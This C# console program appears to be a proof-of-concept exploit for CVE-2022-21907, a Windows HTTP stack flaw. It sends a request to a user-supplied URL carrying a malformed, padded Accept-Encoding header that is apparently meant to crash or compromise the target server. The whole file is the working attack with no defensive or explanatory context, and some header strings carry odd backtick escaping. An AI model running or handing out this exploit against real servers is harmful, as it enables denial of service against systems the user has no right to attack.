using System;
using System.IO;
using System.Net;
using System.Threading.Tasks;

namespace CVE_2022_21907
{
    class Program
    {

        static async Task Main(string[] args)
        {
            var request = (HttpWebRequest)WebRequest.Create(args[1]);
            var payload = "AAAAAA";

            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.62";
            request.Headers["Cache-Control"] = "max-age=0";
            request.Headers["sec-ch-ua"] = "`\" Not; A Brand`\";v=`\"99`\", `\"Microsoft Edge`\";v=`\"97`\", `\"Chromium`\";v=`\"97`\"";
            request.Headers["sec-ch-ua-mobile"] = "?0";
            request.Headers["sec-ch-ua-platform"] = "`\"Windows`\"";
            request.Headers["Upgrade-Insecure-Requests"] = "1";
            request.Headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
            request.Headers["Sec-Fetch-Site"] = "none";
            request.Headers["Sec-Fetch-Mode"] = "navigate";
            request.Headers["Sec-Fetch-User"] = "?1";
            request.Headers["Sec-Fetch-Dest"] = "document";
            request.Headers["Accept-Encoding"] = $"AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************{payload}, *, ,";
            request.Headers["Accept-Language"] = "fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6";
            request.Headers["If-None-Match"] = "`\"ef66c67b14dd81: 0`\"";
            request.Headers["If-Modified-Since"] = "Wed, 19 Jan 2022 09:11:03 GMT";
            
            var response = await request.GetResponseAsync();
            var stream = response.GetResponseStream();

            using (var reader = new StreamReader(stream))
                Console.WriteLine(reader.ReadToEnd());
        }
    }
}
